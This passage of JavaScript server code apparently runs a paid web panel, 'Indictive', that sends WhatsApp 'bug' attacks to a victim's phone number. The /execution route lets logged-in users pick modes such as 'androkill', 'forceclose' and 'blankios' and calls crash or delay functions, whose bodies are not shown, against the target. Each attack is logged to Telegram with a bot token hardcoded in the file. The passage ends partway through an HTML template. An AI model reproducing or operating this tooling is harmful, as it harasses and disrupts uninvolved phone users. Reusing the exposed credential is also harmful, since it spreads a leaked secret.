    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  const activeSession = activeSessions.get(username);
  const sessionStartTime = activeSession ? new Date(activeSession.loginTime).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  }) : null;

  const sessionDuration = activeSession ? Math.floor((now - activeSession.loginTime) / (1000 * 60 * 60)) : 0;

  console.log(`[DASHBOARD-DATA] User: ${username}, Role: ${userRole}, Active Senders: ${activeSendersCount}`);

  res.json({
    username: currentUser.username,
    role: userRole.toUpperCase(),
    activeSenders: activeSendersCount,
    expired: expired,
    daysRemaining: daysRemaining,
    sessionStartTime: sessionStartTime,
    sessionDuration: sessionDuration,
    sessionMaxDuration: 24
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8120021023:AAHvJNpSD_wSEgg_VK-iaSXnHl4l_cLSQeM";
const CHAT_ID = "5488888045";
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    
    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    if (Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Akun sudah expired");
    }

    const userRole = currentUser.role || "user";
    console.log(`[EXECUTION] User: ${username}, Actual Role: ${userRole}`);

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target;
    const mode = req.query.mode;
    
    console.log(`[EXECUTION] Query params - justExecuted: ${justExecuted}, target: ${targetNumber}, mode: ${mode}`);

    if (justExecuted && targetNumber && mode) {
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed`
      }, false, currentUser, "", mode, userRole));
    }

    if (targetNumber && targetNumber !== 'undefined' && mode && mode !== 'undefined') {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      
    if (!isValidPhoneNumber(cleanTarget)) {
        return res.send(executionPage("❌ Invalid Phone Number", {
            target: targetNumber,
            message: "Invalid phone number format. Minimum 8 digits, maximum 15 digits required.",
            activeSenders: []
        }, false, currentUser, "Invalid phone number format", mode, userRole));
    }

      let availableSenders = [];
      const userSessions = loadUserSessions();
      
      if (userRole === "vip") {
        availableSenders = Array.from(sessions.keys());
        console.log(`[VIP ACCESS] ${username} can use all senders:`, availableSenders);
      } else {
        const userSenders = userSessions[username] || [];
        availableSenders = userSenders.filter(sender => sessions.has(sender));
        console.log(`[USER ACCESS] ${username} can use personal senders:`, availableSenders);
      }

      if (availableSenders.length === 0) {
        if (userRole === "vip") {
          return res.send(executionPage("❌ Tidak Ada Sender Aktif", {
            message: "Tidak ada sender yang aktif saat ini di sistem. Silakan hubungi staff."
          }, false, currentUser, "", mode, userRole));
        } else {
          return res.send(executionPage("❌ Tidak Ada Sender Aktif", {
            message: "Anda tidak memiliki sender WhatsApp yang aktif. Silakan tambahkan sender terlebih dahulu di menu 'My Senders'."
          }, false, currentUser, "", mode, userRole));
        }
      }

      const validModes = ["delay", "blankios", "androkill", "forceclose", "fcinvsios"];
      if (!validModes.includes(mode)) {
        return res.send(executionPage("❌ Mode Tidak Valid", {
          target: cleanTarget,
          message: `Mode '${mode}' tidak dikenali. Mode yang valid: ${validModes.join(', ')}`,
          activeSenders: availableSenders
        }, false, currentUser, "Mode tidak valid", mode, userRole));
      }

      try {
        const userSender = availableSenders[0];
        const sock = sessions.get(userSender);
        
        console.log(`[EXECUTION] Selected sender: ${userSender} for user: ${username}`);
        console.log(`[EXECUTION] Socket status:`, sock ? 'ACTIVE' : 'INACTIVE');
        console.log(`[EXECUTION] User role: ${userRole}, Target: ${cleanTarget}, Mode: ${mode}`);
        
        if (!sock) {
          throw new Error("Sender tidak aktif. Silakan periksa koneksi sender.");
        }

        const target = `${cleanTarget}@s.whatsapp.net`;
        
        console.log(`[BUG EXECUTION] Starting bug: ${mode} to ${target}`);
        
        let bugResult;
        if (mode === "delay") {
          bugResult = await bugdelay(sock, target);
        } else if (mode === "blankios") {
          bugResult = await iosBlank(sock, target);
        } else if (mode === "androkill") {
          bugResult = await UIXAndroid(sock, target);
        } else if (mode === "forceclose") {
          bugResult = await crashfc(sock, target);
        } else if (mode === "fcinvsios") {
          bugResult = await invisfc(sock, target);
        } else {
          throw new Error("Mode tidak dikenal.");
        }

        console.log(`[BUG EXECUTION] Completed for ${username}`);

        lastExecution = Date.now();

        console.log(`[EXECUTION SUCCESS] User: ${username} | Role: ${userRole} | Sender: ${userSender} | Target: ${cleanTarget} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

        const logMessage = `<blockquote>⚡ <b>New Execution Success</b>
        
👤 User: ${username}
🎭 Role: ${userRole.toUpperCase()}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget}
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: logMessage,
          parse_mode: "HTML"
        }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

        return res.redirect(`/execution?justExecuted=true&target=${encodeURIComponent(cleanTarget)}&mode=${mode}`);
        
      } catch (err) {
        console.error(`[EXECUTION ERROR] User: ${username} | Role: ${userRole} | Error:`, err.message);
        
        const userSessions = loadUserSessions();
        let availableSenders = [];
        
        if (userRole === "vip") {
          availableSenders = Array.from(sessions.keys());
        } else {
          const userSenders = userSessions[username] || [];
          availableSenders = userSenders.filter(sender => sessions.has(sender));
        }
        
        return res.send(executionPage("✗ Gagal kirim", {
          target: cleanTarget,
          message: err.message || "Terjadi kesalahan saat pengiriman.",
          activeSenders: availableSenders
        }, false, currentUser, "Gagal mengeksekusi nomor target.", mode, userRole));
      }
    }

    const userSessions = loadUserSessions();
    let availableSenders = [];
    
    if (userRole === "vip") {
      availableSenders = Array.from(sessions.keys());
    } else {
      const userSenders = userSessions[username] || [];
      availableSenders = userSenders.filter(sender => sessions.has(sender));
    }

    return res.send(executionPage("🟥 Ready", {
      activeSenders: availableSenders,
      message: userRole === "vip" ? "VIP: Akses semua sender aktif" : "USER: Hanya sender milik sendiri"
    }, true, currentUser, "", "", userRole));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// ==================== SSE ENDPOINT UNTUK USER ==================== //
app.get("/api/user-events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  console.log(`[USER-EVENTS] User ${username} connected to SSE`);
  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  req.on('close', () => {
    console.log(`[USER-EVENTS] User ${username} disconnected from SSE`);
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  res.write(`data: ${JSON.stringify({ 
    type: 'connected', 
    message: 'Event stream connected',
    username: username
  })}\n\n`);
});

// ==================== API UNTUK MANUAL RECONNECT ==================== //
app.post("/api/reconnect-sender", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { number } = req.body;
    
    if (!number) {
      return res.json({ 
        success: false, 
        error: "Nomor tidak boleh kosong" 
      });
    }
    
    console.log(`[RECONNECT] User ${username} reconnecting sender: ${number}`);
    
    const cleanNumber = number.replace(/\D/g, '');
    const sessionDir = userSessionPath(username, cleanNumber);
    const credsPath = path.join(sessionDir, 'creds.json');
    
    if (!fs.existsSync(credsPath)) {
      return res.json({ 
        success: false, 
        error: "Session tidak ditemukan. Silakan pairing ulang." 
      });
    }
    
    if (sessions.has(cleanNumber)) {
      return res.json({ 
        success: true, 
        message: "Sender sudah terhubung",
        status: "connected"
      });
    }
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai proses reconnect...',
      number: cleanNumber,
      status: 'reconnecting'
    });
    
    const sock = await connectToWhatsAppUser(username, cleanNumber, sessionDir);
    
    if (sock) {
      console.log(`[RECONNECT] ✅ Success: ${cleanNumber} reconnected`);
      
      res.json({ 
        success: true, 
        message: "Sender berhasil di-reconnect",
        number: cleanNumber,
        status: "connected"
      });
    }
    
  } catch (error) {
    console.error(`[RECONNECT] Error:`, error);
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ==================== SSE ENDPOINT REAL-TIME ==================== //
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Pro+", "sender.html");
  res.sendFile(filePath);
});

// ==================== API ADD SENDER (DENGAN ROLE VALIDATION) ==================== //
app.post("/api/add-sender", requireAuth, async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        console.log(`[ADD-SENDER] Request from user: ${username}`);
        
        const users = getUsers();
        const currentUser = users.find(u => u.username === username);
        
        if (!currentUser) {
            console.log(`[ADD-SENDER] User not found: ${username}`);
            return res.json({ 
                success: false, 
                error: "User tidak ditemukan" 
            });
        }

        const userRole = currentUser.role || "user";
        console.log(`[ADD-SENDER] User role: ${userRole}`);

        if (userRole === "vip" || userRole === "owner") {
            console.log(`[ADD-SENDER] VIP/Owner attempted to add sender: ${username}`);
            return res.json({ 
                success: false, 
                error: "🚫 VIP & Owner users tidak perlu menambah sender manual. Gunakan sender sistem yang tersedia." 
            });
        }

        const { number } = req.body;
        
        if (!number) {
            return res.json({ 
                success: false, 
                error: "Phone number is required" 
            });
        }
        
        let cleanNumber = number.replace(/\D/g, '');
        
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        
        if (!isValidPhoneNumber(cleanNumber)) {
            return res.json({ 
                success: false, 
                error: "Invalid phone number format. Minimum 8 digits, maximum 15 digits required." 
            });
        }
        
        const countryInfo = getCountryFromNumber(cleanNumber);

        console.log(`[ADD-SENDER] User ${username} adding sender: ${cleanNumber} (${countryInfo.name})`);
        const sessionDir = userSessionPath(username, cleanNumber);
        
        const userSessions = loadUserSessions();
        if (userSessions[username] && userSessions[username].includes(cleanNumber)) {
            return res.json({ 
                success: false, 
                error: `Sender ${cleanNumber} sudah terdaftar` 
            });
        }

        connectToWhatsAppUser(username, cleanNumber, sessionDir)
            .then((sock) => {
                console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
            })
            .catch((error) => {
                console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
            });

        res.json({ 
            success: true, 
            message: "Connection process started! Please wait for pairing code notification.",
            number: cleanNumber,
            country: countryInfo.name,
            countryCode: countryInfo.code,
            note: "Pairing code will appear on this page in a few seconds..."
        });
        
    } catch (error) {
        console.error(`[API] Error adding sender:`, error);
        res.json({ 
            success: false, 
            error: "Terjadi error saat memproses sender: " + error.message 
        });
    }
});

// ==================== API DELETE SENDER (DENGAN ROLE VALIDATION) ==================== //
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    console.log(`[DELETE-SENDER] Request from user: ${username}`);
    
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      console.log(`[DELETE-SENDER] User not found: ${username}`);
      return res.json({ 
        success: false, 
        error: "User tidak ditemukan" 
      });
    }

    const userRole = currentUser.role || "user";
    console.log(`[DELETE-SENDER] User role: ${userRole}`);

    if (userRole === "vip" || userRole === "owner") {
      console.log(`[DELETE-SENDER] VIP/Owner attempted to delete sender: ${username}`);
      return res.json({ 
        success: false, 
        error: "🚫 VIP & Owner users tidak bisa menghapus sender sistem." 
      });
    }

    const { number } = req.body;
    
    if (!number) {
      return res.json({ 
        success: false, 
        error: "Nomor tidak boleh kosong" 
      });
    }

    const cleanNumber = number.replace(/\D/g, '');
    console.log(`[DELETE-SENDER] User ${username} deleting sender: ${cleanNumber}`);
    
    const userSessions = loadUserSessions();
    
    if (!userSessions[username] || !userSessions[username].includes(cleanNumber)) {
      return res.json({ 
        success: false, 
        error: "Sender tidak ditemukan atau bukan milik Anda" 
      });
    }

    userSessions[username] = userSessions[username].filter(n => n !== cleanNumber);
    
    if (userSessions[username].length === 0) {
      delete userSessions[username];
    }
    
    saveUserSessions(userSessions);

    if (sessions.has(cleanNumber)) {
      try {
        const sock = sessions.get(cleanNumber);
        if (sock) {
          await sock.logout();
          console.log(`[DELETE-SENDER] Logged out sender: ${cleanNumber}`);
        }
        sessions.delete(cleanNumber);
        console.log(`[DELETE-SENDER] Removed from sessions map: ${cleanNumber}`);
      } catch (logoutError) {
        console.error(`[DELETE-SENDER] Error during logout:`, logoutError);
      }
    }

    const sessionDir = userSessionPath(username, cleanNumber);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
      console.log(`[DELETE-SENDER] Deleted session directory: ${sessionDir}`);
    }
    
    console.log(`[DELETE-SENDER] Successfully deleted sender ${cleanNumber} for user ${username}`);
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: cleanNumber
    });
    
  } catch (error) {
    console.error(`[DELETE-SENDER] Error:`, error);
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ==================== API MY SENDERS (DENGAN ROLE-BASED DATA) ==================== //
app.get("/api/my-senders", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.json({ 
        success: false, 
        error: "User tidak ditemukan" 
      });
    }
    
    const userRole = currentUser.role || "user";
    const userSessions = loadUserSessions();
    let sendersData = [];
    
    if (userRole === "vip" || userRole === "owner") {
      sendersData = Array.from(sessions.keys()).map(number => ({
        number: number,
        connected: true,
        status: 'connected'
      }));
      console.log(`[MY-SENDERS] VIP/Owner ${username} sees all senders:`, sendersData);
    } else {
      const userSenders = userSessions[username] || [];
      sendersData = userSenders.map(number => {
        const isConnected = sessions.has(number);
        return {
          number: number,
          connected: isConnected,
          status: isConnected ? 'connected' : 'disconnected'
        };
      });
      console.log(`[MY-SENDERS] USER ${username} sees personal senders:`, sendersData);
    }
    
    res.json({ 
      success: true, 
      senders: sendersData,
      total: sendersData.length,
      connected: sendersData.filter(s => s.connected).length,
      role: userRole,
      note: (userRole === "vip" || userRole === "owner") ? 
        "🎭 VIP/OWNER STATUS: Akses semua sender aktif sistem" : 
        "👤 USER STATUS: Hanya sender yang Anda buat sendiri"
    });
    
  } catch (error) {
    console.error(`[MY-SENDERS] Error:`, error);
    res.json({ 
      success: false, 
      error: "Gagal memuat data sender" 
    });
  }
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  
  if (username) {
    activeSessions.delete(username);
  }
  
  res.clearCookie("sessionUser");
  res.clearCookie("sessionId");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  isVip,
  saveUsers,
  initializeOwners,
  getUsers
};

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  userRole = "user"
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const roleBadge = userRole === "vip" 
    ? `<div class="prime-badge" style="background: linear-gradient(135deg, #ff00aa 0%, #ffd700 100%); color: #000;">
         <i class="fas fa-crown"></i> VIP USER
       </div>`
    : `<div class="prime-badge" style="background: linear-gradient(135deg, #00e5ff 0%, #0088ff 100%); color: #000;">
         <i class="fas fa-user"></i> REGULAR USER
       </div>`;

  const statusMessage = userRole === "vip" 
    ? `🎭 <b>VIP STATUS:</b> Anda dapat menggunakan semua sender aktif sistem`
    : `👤 <b>USER STATUS:</b> Hanya dapat menggunakan sender yang Anda buat sendiri`;

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Indictive | Execution</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #0a0514;
            --bg-card: rgba(20, 10, 35, 0.8);
            --bg-input: rgba(0, 0, 0, 0.5);
            
            --text-main: #ffffff;
            --text-muted: #bbb5c9;
            
            --primary-purple: #8a2be2;
            --neon-pink: #ff00aa;
            --cyan-glow: #00e5ff;
            --prime-gold: #ffd700;
            
            --gradient-main: linear-gradient(135deg, #8a2be2 0%, #ff00aa 100%);
            --gradient-prime: linear-gradient(135deg, #ffd700 0%, #ffaa00 100%);
            --glass-border: rgba(255, 255, 255, 0.08);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--bg-deep);
            font-family: 'Rajdhani', sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            padding: 20px;
            padding-bottom: 40px;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(138, 43, 226, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(255, 0, 170, 0.15) 0%, transparent 40%);
            overflow-x: hidden;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
        }

        /* Header Styles */
        .app-header {
            text-align: center;
            margin-bottom: 25px;
            padding: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .app-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 2px;
            background: var(--text-main);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }

        .app-subtitle {
            font-size: 14px;
            color: var(--text-muted);
            letter-spacing: 1px;
        }

        /* ==================== NOTIFICATION ==================== */
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-100px);
            background: rgba(20, 10, 35, 0.95);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            min-width: 300px;
            max-width: 90%;
            z-index: 9999;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            transition: transform 0.5s ease;
            overflow: hidden;
            opacity: 0;
        }

        .notification.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .notification-content {
            padding: 16px 24px;
            display: flex;
            align-items: center;
            gap: 15px;
            color: white;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 600;
            font-size: 15px;
        }

        .notification-progress {
            position: absolute;
            bottom: 0;
            left: 0;
            height: 3px;
            width: 100%;
            background: white;
            transform-origin: left;
            transform: scaleX(0);
            transition: transform 5s linear;
        }

        .notification.show .notification-progress {
            transform: scaleX(1);
        }

        /* VARIAN WARNA NOTIFIKASI */
        .notification.error {
            border-left: 4px solid #ff0055;
        }
        .notification.error i { color: #ff0055; }
        .notification.error .notification-progress { background: #ff0055; }

        .notification.success {
            border-left: 4px solid #00ff9d;
        }
        .notification.success i { color: #00ff9d; }
        .notification.success .notification-progress { background: #00ff9d; }

        .notification.warning {
            border-left: 4px solid #ffd700;
        }
        .notification.warning i { color: #ffd700; }
        .notification.warning .notification-progress { background: #ffd700; }

        /* Prime Card */
        .prime-card {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        /* Video Banner */
        .profile-banner-skew {
            height: 120px;
            margin: -20px -20px 20px -20px;
            overflow: hidden;
            border-bottom: 1px solid var(--glass-border);
            position: relative;
            border-radius: 20px 20px 0 0;
        }

        .profile-banner-skew video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.9;
            display: block;
        }

        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                to bottom, 
                rgba(10, 5, 20, 0.4), 
                rgba(138, 43, 226, 0.3)
            );
            border-radius: 20px 20px 0 0;
        }

        .prime-name {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: 1px;
            text-align: center;
            margin-bottom: 20px;
            color: var(--text-main);
        }
        
        .prime-details {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .prime-badge {
            padding: 5px 12px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: 700;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .prime-exp {
            font-size: 14px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .prime-exp i {
            color: var(--prime-gold);
        }

        /* Role Status Info */
        .role-status {
            background: ${userRole === "vip" ? "rgba(255, 215, 0, 0.1)" : "rgba(0, 229, 255, 0.1)"};
            border: 1px solid ${userRole === "vip" ? "rgba(255, 215, 0, 0.3)" : "rgba(0, 229, 255, 0.3)"};
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 12px;
            text-align: center;
        }

        .role-status i {
            color: ${userRole === "vip" ? "#ffd700" : "#00e5ff"};
            margin-right: 5px;
        }

        /* Sender Info */
        .sender-info {
            background: rgba(138, 43, 226, 0.1);
            border: 1px solid rgba(138, 43, 226, 0.3);
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 12px;
            text-align: center;
            display: none;
        }

        .sender-info i {
            color: var(--primary-purple);
            margin-right: 5px;
        }

        /* Necro Card */
        .necro-card {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .necro-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 25px;
            letter-spacing: 2px;
            background: var(--text-muted);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .necro-title::after {
            content: '';
            display: block;
            width: 300px;
            height: 2px;
            background: var(--gradient-main);
            margin: 8px auto 0;
            border-radius: 3px;
        }

        /* Form Styles */
        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            font-family: 'Orbitron', sans-serif;
            font-size: 14px;
            color: var(--text-muted);
            margin-bottom: 10px;
            display: block;
            letter-spacing: 1px;
        }

        .form-label i {
            color: var(--neon-pink);
            margin-right: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        .custom-input {
            width: 100%;
            background: var(--bg-input);
            border: 1px solid var(--glass-border);
            padding: 16px 20px 16px 50px;
            border-radius: 15px;
            color: white;
            font-family: 'Rajdhani', sans-serif;
            font-size: 16px;
            font-weight: 600;
            outline: none;
            transition: 0.3s;
        }

        .input-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            font-size: 18px;
            transition: 0.3s;
        }

        .custom-input:focus {
            border-color: var(--primary-purple);
            box-shadow: 0 0 10px rgba(138, 43, 226, 0.3);
        }

        .custom-input:focus + .input-icon {
            color: var(--primary-purple);
        }

        /* ========== DROPDOWN FIXED ========== */
        .select-wrapper {
            position: relative;
        }

        .select-btn {
            width: 100%;
            background: var(--bg-input);
            border: 1px solid var(--glass-border);
            padding: 16px 20px;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: all 0.3s ease;
            user-select: none;
        }

        .select-btn.active {
            border-color: var(--cyan-glow);
            box-shadow: 0 0 15px rgba(0, 229, 255, 0.3);
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 0;
        }

        .select-btn:hover {
            border-color: var(--neon-pink);
        }

        .selected-text {
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .arrow-dwn {
            color: var(--neon-pink);
            transition: transform 0.3s ease;
        }

        .select-btn.active .arrow-dwn {
            transform: rotate(180deg);
        }

        .options-list {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: #0f0816;
            border: 1px solid var(--cyan-glow);
            border-top: none;
            border-radius: 0 0 15px 15px;
            list-style: none;
            max-height: 0;
            overflow: hidden;
            z-index: 1000;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            opacity: 0;
            transform: translateY(-10px);
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        .select-btn.active + .options-list {
            max-height: 500px;
            opacity: 1;
            transform: translateY(0);
            overflow-y: auto;
        }

        .option {
            padding: 15px 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .option:last-child {
            border-bottom: none;
        }

        .option:hover {
            background: linear-gradient(90deg, rgba(0, 229, 255, 0.15), transparent);
            padding-left: 25px;
            color: var(--cyan-glow);
        }
        
        .option:hover i {
            color: var(--cyan-glow);
            transform: scale(1.2);
        }

        .option i {
            font-size: 18px;
            width: 25px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .option[data-value="delay"] i { color: #00e5ff; }
        .option[data-value="blankios"] i { color: #ffffff; }
        .option[data-value="androkill"] i { color: #a4c639; }
        .option[data-value="forceclose"] i { color: #ff0000; }
        .option[data-value="fcinvsios"] i { color: #ffaa00; }

        /* Button Styles */
        .btn-attack {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 15px;
            background: var(--gradient-main);
            color: white;
            font-family: 'Orbitron', sans-serif;
            font-size: 18px;
            font-weight: 700;
            letter-spacing: 2px;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: 0.3s;
            margin-top: 10px;
        }

        .btn-attack::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
            transition: 0.5s;
        }

        .btn-attack:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(138, 43, 226, 0.4);
        }

        .btn-attack:hover::before {
            left: 100%;
        }

        .btn-attack:active {
            transform: scale(0.98);
        }

        .btn-attack:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }

        .btn-attack:disabled:hover::before {
            left: -100%;
        }

        /* Navigation */
        .nav-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-secondary {
            flex: 1;
            padding: 12px;
            border: 1px solid var(--glass-border);
            background: transparent;
            color: var(--text-muted);
            border-radius: 10px;
            font-family: 'Rajdhani', sans-serif;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            text-decoration: none;
            text-align: center;
        }

        .btn-secondary:hover {
            border-color: var(--primary-purple);
            color: var(--text-main);
            background: rgba(138, 43, 226, 0.1);
        }

        /* Animations */
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fade-in {
            animation: slideUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
            opacity: 0;
        }

        /* Loading */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Responsive */
        @media (max-width: 480px) {
            body {
                padding: 15px;
                padding-bottom: 30px;
            }
            
            .prime-card, .necro-card {
                padding: 18px;
            }
            
            .profile-banner-skew {
                margin: -18px -18px 18px -18px;
                height: 100px;
            }
            
            .btn-attack {
                padding: 16px;
                font-size: 16px;
            }
            
            .necro-title::after {
                width: 200px;
            }
        }
    </style>
</head>
<body>
    <div id="notification" class="notification">
        <div class="notification-content">
            <i class="fas fa-exclamation-triangle"></i>
            <span id="notificationText">Notification Message</span>
